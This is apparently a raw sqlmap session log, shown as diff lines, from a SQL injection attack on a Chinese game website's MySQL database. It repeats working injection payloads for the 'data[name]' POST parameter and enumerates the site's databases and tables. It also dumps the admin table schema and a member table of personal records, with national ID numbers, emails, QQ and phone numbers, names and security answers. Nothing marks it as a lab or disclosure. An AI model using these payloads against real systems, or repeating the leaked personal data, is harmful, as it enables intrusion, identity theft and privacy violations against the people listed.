+| my_admin                              |
+| my_admin_panel                        |
+| my_admin_role                         |
+| my_admin_role_priv                    |
+| my_announce                           |
+| my_attachment                         |
+| my_attachment_index                   |
+| my_badword                            |
+| my_block                              |
+| my_block_history                      |
+| my_block_priv                         |
+| my_cache                              |
+| my_category                           |
+| my_category_priv                      |
+| my_collection_content                 |
+| my_collection_history                 |
+| my_collection_node                    |
+| my_collection_program                 |
+| my_content_check                      |
+| my_copyfrom                           |
+| my_datacall                           |
+| my_dbsource                           |
+| my_download                           |
+| my_download_data                      |
+| my_downservers                        |
+| my_extend_setting                     |
+| my_favorite                           |
+| my_hits                               |
+| my_ipbanned                           |
+| my_keylink                            |
+| my_keyword                            |
+| my_keyword_data                       |
+| my_link                               |
+| my_linkage                            |
+| my_log                                |
+| my_member                             |
+| my_member_detail                      |
+| my_member_group                       |
+| my_member_menu                        |
+| my_member_verify                      |
+| my_member_vip                         |
+| my_menu                               |
+| my_message                            |
+| my_message_data                       |
+| my_message_group                      |
+| my_model                              |
+| my_model_field                        |
+| my_module                             |
+| my_mood                               |
+| my_news                               |
+| my_news_data                          |
+| my_page                               |
+| my_pay_account                        |
+| my_pay_payment                        |
+| my_pay_spend                          |
+| my_picture                            |
+| my_picture_data                       |
+| my_position                           |
+| my_position_data                      |
+| my_poster                             |
+| my_poster_201504                      |
+| my_poster_space                       |
+| my_queue                              |
+| my_release_point                      |
+| my_search                             |
+| my_search_keyword                     |
+| my_session                            |
+| my_site                               |
+| my_sms_report                         |
+| my_special                            |
+| my_special_c_data                     |
+| my_special_content                    |
+| my_sphinx_counter                     |
+| my_sso_admin                          |
+| my_sso_applications                   |
+| my_sso_members                        |
+| my_sso_messagequeue                   |
+| my_sso_session                        |
+| my_sso_settings                       |
+| my_tag                                |
+| my_template_bak                       |
+| my_times                              |
+| my_type                               |
+| my_urlrule                            |
+| my_video                              |
+| my_video_content                      |
+| my_video_data                         |
+| my_video_store                        |
+| my_vote_data                          |
+| my_vote_option                        |
+| my_vote_subject                       |
+| my_wap                                |
+| my_wap_type                           |
+| my_word                               |
+| my_workflow                           |
++---------------------------------------+
+
+Database: information_schema
+[28 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| KEY_COLUMN_USAGE                      |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+Database: 5ebo_www
+[145 tables]
++---------------------------------------+
+| media_access                          |
+| media_node                            |
+| media_role                            |
+| media_role_user                       |
+| media_user                            |
+| v9_activity_role_level                |
+| v9_admin                              |
+| v9_admin_panel                        |
+| v9_admin_role                         |
+| v9_admin_role_priv                    |
+| v9_all_game_view                      |
+| v9_announce                           |
+| v9_attachment                         |
+| v9_attachment_index                   |
+| v9_badword                            |
+| v9_block                              |
+| v9_block_history                      |
+| v9_block_priv                         |
+| v9_cache                              |
+| v9_category                           |
+| v9_category_priv                      |
+| v9_collection_content                 |
+| v9_collection_history                 |
+| v9_collection_node                    |
+| v9_collection_program                 |
+| v9_comment                            |
+| v9_comment_check                      |
+| v9_comment_data_1                     |
+| v9_comment_setting                    |
+| v9_comment_table                      |
+| v9_content_check                      |
+| v9_copyfrom                           |
+| v9_datacall                           |
+| v9_dbsource                           |
+| v9_dl_patch                           |
+| v9_dl_patch_data                      |
+| v9_dl_reg_return_view                 |
+| v9_dlbbs_news                         |
+| v9_dlbbs_news_data                    |
+| v9_download                           |
+| v9_download_data                      |
+| v9_downservers                        |
+| v9_extend_setting                     |
+| v9_favorite                           |
+| v9_found_pass_view                    |
+| v9_game_activate                      |
+| v9_game_areas                         |
+| v9_game_areas_view                    |
+| v9_game_card                          |
+| v9_game_card_view                     |
+| v9_game_code                          |
+| v9_game_login_view                    |
+| v9_game_time_view                     |
+| v9_games                              |
+| v9_gift                               |
+| v9_gift_data                          |
+| v9_hits                               |
+| v9_ipbanned                           |
+| v9_keylink                            |
+| v9_keyword                            |
+| v9_keyword_data                       |
+| v9_link                               |
+| v9_linkage                            |
+| v9_log                                |
+| v9_media                              |
+| v9_media_ad                           |
+| v9_media_anomalydata                  |
+| v9_media_bar                          |
+| v9_media_bar_ip_library               |
+| v9_media_page                         |
+| v9_media_page_detail                  |
+| v9_media_page_total_detail            |
+| v9_media_partners                     |
+| v9_media_setting                      |
+| v9_media_yy_main_date                 |
+| v9_media_yy_overall_data              |
+| v9_member                             |
+| v9_member_detail                      |
+| v9_member_group                       |
+| v9_member_login                       |
+| v9_member_menu                        |
+| v9_member_total                       |
+| v9_member_verify                      |
+| v9_member_vip                         |
+| v9_menu                               |
+| v9_message                            |
+| v9_message_data                       |
+| v9_message_group                      |
+| v9_model                              |
+| v9_model_field                        |
+| v9_module                             |
+| v9_mood                               |
+| v9_news                               |
+| v9_news_data                          |
+| v9_news_dl                            |
+| v9_news_dl_data                       |
+| v9_page                               |
+| v9_pay_account                        |
+| v9_pay_payment                        |
+| v9_pay_spend                          |
+| v9_pay_spend_total                    |
+| v9_pay_statistics                     |
+| v9_picture                            |
+| v9_picture_data                       |
+| v9_position                           |
+| v9_position_data                      |
+| v9_poster                             |
+| v9_poster_201402                      |
+| v9_poster_201403                      |
+| v9_poster_201404                      |
+| v9_poster_201405                      |
+| v9_poster_space                       |
+| v9_queue                              |
+| v9_release_point                      |
+| v9_search                             |
+| v9_search_keyword                     |
+| v9_session                            |
+| v9_site                               |
+| v9_sms_report                         |
+| v9_special                            |
+| v9_special_c_data                     |
+| v9_special_content                    |
+| v9_sphinx_counter                     |
+| v9_sso_admin                          |
+| v9_sso_applications                   |
+| v9_sso_members                        |
+| v9_sso_messagequeue                   |
+| v9_sso_session                        |
+| v9_sso_settings                       |
+| v9_tag                                |
+| v9_template_bak                       |
+| v9_times                              |
+| v9_type                               |
+| v9_urlrule                            |
+| v9_user_code_view                     |
+| v9_video                              |
+| v9_video_content                      |
+| v9_video_data                         |
+| v9_video_store                        |
+| v9_vote_data                          |
+| v9_vote_option                        |
+| v9_vote_subject                       |
+| v9_wap                                |
+| v9_wap_type                           |
+| v9_workflow                           |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: ebogame_member_info
+[14 entries]
++--------+----------+--------------------+-----------+-----+------+------+----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+| id     | memberid | idnumber           | qq        | sex | code | city | email                | phone | day   | wallow | year   | address | month   | truename | save_a_2 | save_a_1 | save_q_2 | save_q_1 | province | nickname   | tellphone   |
++--------+----------+--------------------+-----------+-----+------+------+----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+| 321320 | 321608   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727177@qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | NULL       | NULL        |
+| 321326 | 321614   | 410803198909200158 | <blank>   | 1   | NULL | 8    | 592727177@qq.com     | NULL  | 26    | -1     | 1950   | NULL    | 11      | 许亮亮      | 河南焦作     | 19910416 | 4        | 12       | 12       | 许诺         | <blank>     |
+| 321329 | 321618   | 130506198805050022 | NULL      | 1   | NULL | NULL | fengfen@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 峰峰       | NULL     | NULL     | 0        | 0        | NULL     | 晴朗         | NULL        |
+| 321330 | 321619   | 130506198805050025 | NULL      | 1   | NULL | NULL | zhaoyazhi@126.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵雅芝      | NULL     | NULL     | 0        | 0        | NULL     | 灵芝         | NULL        |
+| 321331 | 321620   | 130804198806050999 | 793153125 | 1   | NULL | 6    | baiyanzong@126.com   | NULL  | 2     | -1     | 1950   | NULL    | 12      | 白岩松      | 赤那       | 哈弗       | 6        | 4        | 6        | 小白         | 13810231872 |
+| 321332 | 321621   | 120102198410290333 | NULL      | 1   | NULL | NULL | 111111@111111.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 本规定      | NULL     | NULL     | 0        | 0        | NULL     | aaaaaa     | NULL        |
+| 321333 | 321622   | 130804198806054444 | NULL      | 1   | NULL | NULL | guozhiwei@126.com    | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭志伟      | NULL     | NULL     | 0        | 0        | NULL     | 小薇         | NULL        |
+| 321334 | 321623   | 130804198806050565 | NULL      | 1   | NULL | NULL | sunhaifa@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海法      | NULL     | NULL     | 0        | 0        | NULL     | qinglang   | NULL        |
+| 321335 | 321624   | 410928198903284517 | NULL      | 1   | NULL | NULL | sunhaifa1314@163.com | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | 1233haifa  | NULL        |
+| 321336 | 321625   | 211011198810135544 | <blank>   | 2   | NULL | 1    | 351479026@qq.com     | NULL  | 13    | -1     | 1990   | NULL    | 10      | 师岩       | 19       | 19       | 9        | 9        | 7        | 冰蝶儿        | <blank>     |
+| 321337 | 321626   | 110101198612214012 | NULL      | 1   | NULL | NULL | k@q.com              | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘世瀚      | NULL     | NULL     | 0        | 0        | NULL     | lisan      | NULL        |
+| 321338 | 321627   | 545464987879877    | NULL      | 1   | NULL | NULL | liang@liang.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | 小梁         | NULL        |
+| 321339 | 321629   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727100@qq.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | 我就是我就是     | NULL        |
+| 321340 | 321630   | 130804198806050444 | 799996565 | 1   | NULL | 1    | liangzhao12@126.com  | NULL  | 9     | -1     | 1950   | NULL    | 12      | 梁立山      | 9月29日    | 赵晓彤      | 12       | 3        | 4        | xiangtalan | 13810232336 |
++--------+----------+--------------------+-----------+-----+------+------+----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+
+Database: 5ebo
+Table: ebogame_content
+[1 entry]
++-----------+
+| contentid |
++-----------+
+| 1874      |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: admin
+[11 columns]
++---------------+-----------------------+
+| Column        | Type                  |
++---------------+-----------------------+
+| card          | varchar(255)          |
+| email         | varchar(40)           |
+| encrypt       | varchar(6)            |
+| lang          | varchar(6)            |
+| lastloginip   | varchar(15)           |
+| lastlogintime | int(10) unsigned      |
+| password      | varchar(32)           |
+| realname      | varchar(50)           |
+| roleid        | smallint(5)           |
+| userid        | mediumint(6) unsigned |
+| username      | varchar(20)           |
++---------------+-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: ebogame_member_info
+[15 entries]
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+| id     | memberid | idnumber           | qq        | sex | code | city | email                 | phone | day   | wallow | year   | address | month   | truename | save_a_2 | save_a_1 | save_q_2 | save_q_1 | province | nickname   | tellphone   |
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+| 321320 | 321608   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727177@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | NULL       | NULL        |
+| 321326 | 321614   | 410803198909200158 | <blank>   | 1   | NULL | 8    | 592727177@qq.com      | NULL  | 26    | -1     | 1950   | NULL    | 11      | 许亮亮      | 河南焦作     | 19910416 | 4        | 12       | 12       | 许诺         | <blank>     |
+| 321329 | 321618   | 130506198805050022 | NULL      | 1   | NULL | NULL | fengfen@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 峰峰       | NULL     | NULL     | 0        | 0        | NULL     | 晴朗         | NULL        |
+| 321330 | 321619   | 130506198805050025 | NULL      | 1   | NULL | NULL | zhaoyazhi@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵雅芝      | NULL     | NULL     | 0        | 0        | NULL     | 灵芝         | NULL        |
+| 321331 | 321620   | 130804198806050999 | 793153125 | 1   | NULL | 6    | baiyanzong@126.com    | NULL  | 2     | -1     | 1950   | NULL    | 12      | 白岩松      | 赤那       | 哈弗       | 6        | 4        | 6        | 小白         | 13810231872 |
+| 321332 | 321621   | 120102198410290333 | NULL      | 1   | NULL | NULL | 111111@111111.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 本规定      | NULL     | NULL     | 0        | 0        | NULL     | aaaaaa     | NULL        |
+| 321333 | 321622   | 130804198806054444 | NULL      | 1   | NULL | NULL | guozhiwei@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭志伟      | NULL     | NULL     | 0        | 0        | NULL     | 小薇         | NULL        |
+| 321334 | 321623   | 130804198806050565 | NULL      | 1   | NULL | NULL | sunhaifa@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海法      | NULL     | NULL     | 0        | 0        | NULL     | qinglang   | NULL        |
+| 321335 | 321624   | 410928198903284517 | NULL      | 1   | NULL | NULL | sunhaifa1314@163.com  | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | 1233haifa  | NULL        |
+| 321336 | 321625   | 211011198810135544 | <blank>   | 2   | NULL | 1    | 351479026@qq.com      | NULL  | 13    | -1     | 1990   | NULL    | 10      | 师岩       | 19       | 19       | 9        | 9        | 7        | 冰蝶儿        | <blank>     |
+| 321337 | 321626   | 110101198612214012 | NULL      | 1   | NULL | NULL | k@q.com               | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘世瀚      | NULL     | NULL     | 0        | 0        | NULL     | lisan      | NULL        |
+| 321338 | 321627   | 545464987879877    | NULL      | 1   | NULL | NULL | liang@liang.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | 小梁         | NULL        |
+| 321339 | 321629   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727100@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | 我就是我就是     | NULL        |
+| 321340 | 321630   | 130804198806050444 | 799996565 | 1   | NULL | 1    | liangzhao12@126.com   | NULL  | 9     | -1     | 1950   | NULL    | 12      | 梁立山      | 9月29日    | 赵晓彤      | 12       | 3        | 4        | xiangtalan | 13810232336 |
+| 321341 | 321631   | 130804198806050069 | NULL      | 1   | NULL | NULL | wangliting123@126.com | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王丽婷      | NULL     | NULL     | 0        | 0        | NULL     | wangliting | NULL        |
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+------------+-------------+
+
+Database: 5ebo
+Table: ebogame_content
+[0 entries]
++--------+
+| areaid |
++--------+
++--------+
+
+Database: 5ebo
+Table: ebogame_game_areas
+[0 entries]
++----------+
+| admin_id |
++----------+
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: admin
+[11 columns]
++---------------+-----------------------+
+| Column        | Type                  |
++---------------+-----------------------+
+| card          | varchar(255)          |
+| email         | varchar(40)           |
+| encrypt       | varchar(6)            |
+| lang          | varchar(6)            |
+| lastloginip   | varchar(15)           |
+| lastlogintime | int(10) unsigned      |
+| password      | varchar(32)           |
+| realname      | varchar(50)           |
+| roleid        | smallint(5)           |
+| userid        | mediumint(6) unsigned |
+| username      | varchar(20)           |
++---------------+-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: data[name] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: data[name]=test' AND 5189=5189 AND 'dQuk'='dQuk&data[email]=tst&sub=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: data[name]=test' AND (SELECT 5979 FROM(SELECT COUNT(*),CONCAT(0x716b716271,(SELECT (ELT(5979=5979,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xEaZ'='xEaZ&data[email]=tst&sub=
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: data[name]=test' AND (SELECT * FROM (SELECT(SLEEP(5)))BxBf) AND 'HwYk'='HwYk&data[email]=tst&sub=
+---
+web application technology: PHP 5.3.3, Nginx
+back-end DBMS: MySQL 5.0
+Database: 5ebo
+Table: ebogame_member_info
+[42 entries]
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+| id     | memberid | idnumber           | qq        | sex | code | city | email                 | phone | day   | wallow | year   | address | month   | truename | save_a_2 | save_a_1 | save_q_2 | save_q_1 | province | nickname           | tellphone   |
++--------+----------+--------------------+-----------+-----+------+------+-----------------------+-------+-------+--------+--------+---------+---------+----------+----------+----------+----------+----------+----------+--------------------+-------------+
+| 321320 | 321608   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727177@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | NULL               | NULL        |
+| 321326 | 321614   | 410803198909200158 | <blank>   | 1   | NULL | 8    | 592727177@qq.com      | NULL  | 26    | -1     | 1950   | NULL    | 11      | 许亮亮      | 河南焦作     | 19910416 | 4        | 12       | 12       | 许诺                 | <blank>     |
+| 321329 | 321618   | 130506198805050022 | NULL      | 1   | NULL | NULL | fengfen@126.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 峰峰       | NULL     | NULL     | 0        | 0        | NULL     | 晴朗                 | NULL        |
+| 321330 | 321619   | 130506198805050025 | NULL      | 1   | NULL | NULL | zhaoyazhi@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 赵雅芝      | NULL     | NULL     | 0        | 0        | NULL     | 灵芝                 | NULL        |
+| 321331 | 321620   | 130804198806050999 | 793153125 | 1   | NULL | 6    | baiyanzong@126.com    | NULL  | 2     | -1     | 1950   | NULL    | 12      | 白岩松      | 赤那       | 哈弗       | 6        | 4        | 6        | 小白                 | 13810231872 |
+| 321332 | 321621   | 120102198410290333 | NULL      | 1   | NULL | NULL | 111111@111111.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 本规定      | NULL     | NULL     | 0        | 0        | NULL     | aaaaaa             | NULL        |
+| 321333 | 321622   | 130804198806054444 | NULL      | 1   | NULL | NULL | guozhiwei@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 郭志伟      | NULL     | NULL     | 0        | 0        | NULL     | 小薇                 | NULL        |
+| 321334 | 321623   | 130804198806050565 | NULL      | 1   | NULL | NULL | sunhaifa@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海法      | NULL     | NULL     | 0        | 0        | NULL     | qinglang           | NULL        |
+| 321335 | 321624   | 410928198903284517 | NULL      | 1   | NULL | NULL | sunhaifa1314@163.com  | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | 1233haifa          | NULL        |
+| 321336 | 321625   | 211011198810135544 | <blank>   | 2   | NULL | 1    | 351479026@qq.com      | NULL  | 13    | -1     | 1990   | NULL    | 10      | 师岩       | 19       | 19       | 9        | 9        | 7        | 冰蝶儿                | <blank>     |
+| 321337 | 321626   | 110101198612214012 | NULL      | 1   | NULL | NULL | k@q.com               | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 刘世瀚      | NULL     | NULL     | 0        | 0        | NULL     | lisan              | NULL        |
+| 321338 | 321627   | 545464987879877    | NULL      | 1   | NULL | NULL | liang@liang.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | 小梁                 | NULL        |
+| 321339 | 321629   | 410803198909200158 | NULL      | 1   | NULL | NULL | 592727100@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | 我就是我就是             | NULL        |
+| 321340 | 321630   | 130804198806050444 | 799996565 | 1   | NULL | 1    | liangzhao12@126.com   | NULL  | 9     | -1     | 1950   | NULL    | 12      | 梁立山      | 9月29日    | 赵晓彤      | 12       | 3        | 4        | xiangtalan         | 13810232336 |
+| 321341 | 321631   | 130804198806050069 | NULL      | 1   | NULL | NULL | wangliting123@126.com | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 王丽婷      | NULL     | NULL     | 0        | 0        | NULL     | wangliting         | NULL        |
+| 321342 | 321632   | 130804198706050030 | NULL      | 1   | NULL | NULL | 793153125@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 梁立山      | NULL     | NULL     | 0        | 0        | NULL     | bianzouobianxunzao | NULL        |
+| 321343 | 321633   | 130804198406050033 | NULL      | 1   | NULL | NULL | yudidi@126.com        | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 余地       | NULL     | NULL     | 0        | 0        | NULL     | qiglang            | NULL        |
+| 321344 | 321634   | 130804199706050033 | NULL      | 1   | NULL | NULL | litianyi@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天一      | NULL     | NULL     | 0        | 0        | NULL     | litianyi           | NULL        |
+| 321345 | 321635   | 130804198806053323 | NULL      | 1   | NULL | NULL | litianer@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天二      | NULL     | NULL     | 0        | 0        | NULL     | litianer           | NULL        |
+| 321346 | 321636   | 130804198806050123 | NULL      | 1   | NULL | NULL | litiansan@126.com     | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天的      | NULL     | NULL     | 0        | 0        | NULL     | litiansan          | NULL        |
+| 321347 | 321637   | 130804198806050321 | NULL      | 1   | NULL | NULL | litianwu@126.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 李天武      | NULL     | NULL     | 0        | 0        | NULL     | litianwu           | NULL        |
+| 321348 | 321638   | 410928198903284517 | NULL      | 1   | NULL | NULL | 644412780@qq.com      | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 孙海发      | NULL     | NULL     | 0        | 0        | NULL     | sunhaifa123456     | NULL        |
+| 321353 | 321643   | 410803198909200158 | NULL      | 1   | NULL | NULL | 59sdfdsf@qq.com       | NULL  | NULL  | -1     | NULL   | NULL    | NULL    | 许亮亮      | NULL     | NULL     | 0        | 0        | NULL     | ceshiyuanl         | NULL        |
